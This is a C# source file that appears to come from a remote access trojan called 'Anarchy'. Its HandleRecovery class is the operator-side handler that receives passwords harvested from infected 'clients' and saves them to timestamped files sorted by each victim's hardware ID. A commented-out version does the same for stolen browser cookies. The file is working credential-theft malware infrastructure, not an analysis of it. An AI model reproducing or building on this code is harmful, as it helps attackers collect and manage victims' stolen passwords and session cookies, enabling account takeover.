using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string text;
                text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                string asString;
                asString = unpack_msgpack.ForcePathObject("Message").AsString;

                if (string.IsNullOrWhiteSpace(asString))
                {
                    new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried error", Color.MediumPurple);
                }
                else
                {
                    if (!Directory.Exists(text))
                    {
                        Directory.CreateDirectory(text);
                    }
                    File.WriteAllText(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString);
                    new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried success，file located @ ClientsFolder \\ " + unpack_msgpack.ForcePathObject("Hwid").AsString + " \\ Recovery", Color.Purple);
                }
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }

            /*
            try
            {
                string text;
                text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                string asString;
                asString = unpack_msgpack.ForcePathObject("Password").AsString;
                string asString2;
                asString2 = unpack_msgpack.ForcePathObject("Cookies").AsString;
                if (string.IsNullOrWhiteSpace(asString) && string.IsNullOrWhiteSpace(asString2))
                {
                    new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried error", Color.MediumPurple);
                }
                else
                {
                    if (!Directory.Exists(text))
                    {
                        Directory.CreateDirectory(text);
                    }
                    File.WriteAllText(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
                    File.WriteAllText(text + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString2);
                    new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried success，file located @ ClientsFolder \\ " + unpack_msgpack.ForcePathObject("Hwid").AsString + " \\ Recovery", Color.Purple);
                }
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
            */
        }
    }
}
